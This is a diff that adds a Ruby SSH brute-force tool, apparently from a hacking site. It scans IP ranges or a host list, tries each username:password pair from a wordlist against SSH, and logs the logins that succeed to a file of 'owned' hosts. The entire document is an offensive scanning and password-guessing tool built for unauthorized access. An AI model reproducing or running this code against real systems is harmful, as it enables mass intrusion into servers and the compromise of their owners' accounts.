@@ -1,0 +1,172 @@
+#Ruby SSH bruteforcer
+#Visit Us at: http://backdoored.net
+
+#!/usr/bin/ruby
+
+require 'rubygems'
+require 'net/ssh'
+require 'logger'
+require 'timeout'
+def usage()
+puts "Rubby SSH Bruteforcer Coded by nrktx (http://backdoored.net)\n"
+puts "Usage:./narko_ssh startip endip user_pass.txt iplist.txt\n"
+end
+
+if ARGV[0] == nil && ARGV[1] == nil && ARGV[2] == nil && ARGV[3] == nil
+usage()
+exit
+end
+
+vicstart = ARGV[0].to_s
+vicend = ARGV[1].to_s
+vicfile = ARGV[2].to_s
+hostfile = ARGV[3].to_s
+
+
+def ipholocast(startip,endip,vicfile)
+    # 31.31.31.31
+	index1 = startip.index(".") #3
+	index2 = startip[index1+1..startip.length].index(".") + index1 + 1  #7
+	index3 = startip[index2+1..startip.length].index(".") + index2 +1   #10
+	
+	ip1 = startip[0...index1].to_i
+	ip2 = startip[index1+1...index2].to_i
+	ip3 = startip[index2+1...index3].to_i
+	ip4 = startip[index3+1...startip.length].to_i
+
+	index1 = endip.index(".") #3
+        index2 = endip[index1+1..endip.length].index(".") + index1 + 1  #7
+        index3 = endip[index2+1..endip.length].index(".") + index2 +1   #10
+
+	ipe1 = endip[0...index1].to_i
+        ipe2 = endip[index1+1...index2].to_i
+        ipe3 = endip[index2+1...index3].to_i
+        ipe4 = endip[index3+1...endip.length].to_i
+			
+	       for m in 0...255
+                next if ip1 > 254
+		  if ip1 == 254
+		    ip1 = 0
+		  end
+		 for l in 0...255
+		  next if ip2 > 254
+		     if ip2 == 254
+			ip2 = 0
+		     end
+		    for k in 0...255
+		      next if ip3 > 254
+			if ip3 == 254
+			 ip3 = 0
+			end
+			
+
+######################
+			for i in 0...255
+			  next if ip4 > 254 
+			     if ip4 == 254 
+				ip4 = 0
+			     end
+			    victim = ip1.to_s + "." + ip2.to_s + "." + ip3.to_s + "." + ip4.to_s
+				failed = 1
+			        open(vicfile.to_s,"r") do |hoho|
+ 				    hoho.readlines.each do |lines|
+					owned = open("lamer.txt","a+")
+ 
+					z = lines.index(":")
+				         username = lines[0...z]
+					 password = lines[z+1..lines.length].to_s.chop
+					 puts "Now trying Host = " + victim + " Username = " + username + " Password = " + password
+					timeout(5) do
+					begin  
+					session =  Net::SSH.start(victim,22,username,password,
+							 :host_key => "ssh-rsa",
+							 :encryption => "blowfish-cbc"
+							# :compression => "zlib"
+					    	     )
+						rescue Errno::ECONNREFUSED => h
+						failed = 1
+						rescue Timeout::Error => f						
+						failed = 1
+						rescue Net::SSH::AuthenticationFailed => e
+						failed = 1
+						rescue Errno::EHOSTUNREACH => x
+						failed = 1						
+						end
+					 end
+					  if failed != 1
+					   owned.write victim + ":" + username + ":" + password + "\n"
+					   owned.close()
+					  end
+					  failed = 0
+					end
+				 end
+                           if ip1 == ipe1 && ip2 == ipe2 && ip3 == ipe3 && ip4 == ipe4
+                            puts "SCAN DONE\n"
+                            exit
+                           end
+			ip4 = ip4 + 1
+			
+			end
+
+
+
+
+#######################
+
+
+
+		        ip3 = ip3 +1
+			end	
+			ip2 = ip2 +1
+       	        	end
+			ip1 = ip1 +1
+			end
+end
+
+#########################################################
+def ipholocast2(vicfile,hostfile)
+ open(hostfile.to_s,"r") do |deads|
+   deads.readlines.each do |zombie|
+    zombie.chop   
+     failed = 0
+      open(vicfile.to_s,"r") do |hoho|
+        hoho.readlines.each do |lines|
+        owned = open("lamer.txt","a+")
+        z = lines.index(":")
+        username = lines[0...z]
+        password = lines[z+1..lines.length].chop
+        #puts "Now trying Host = " + zombie + " Username = " + username + " Password = " + password
+           timeout(5) do
+		begin
+	           session =  Net::SSH.start(zombie,22,username,password,
+                   :host_key => "ssh-rsa",
+                   :encryption => "blowfish-cbc"
+                   # :compression => "zlib"
+                   )
+		   rescue Errno::ECONNREFUSED => haha
+		   failed = 1         
+                   rescue Timeout::Error => f
+		   failed = 1
+		   rescue Net::SSH::AuthenticationFailed => e
+		   failed = 1
+		   rescue Errno::EHOSTUNREACH => x
+                   failed = 1
+                   end
+		end
+        	      if failed != 1
+                      owned.write zombie.chop + ":" + username + ":" + password + "\n"
+                      owned.close()
+                      end
+                   failed = 0
+	      end
+           end
+         end
+       end
+end
+#################################################
+
+if hostfile.to_i == 1
+ipholocast(vicstart,vicend,vicfile)
+end
+ipholocast2(vicfile,hostfile)
+
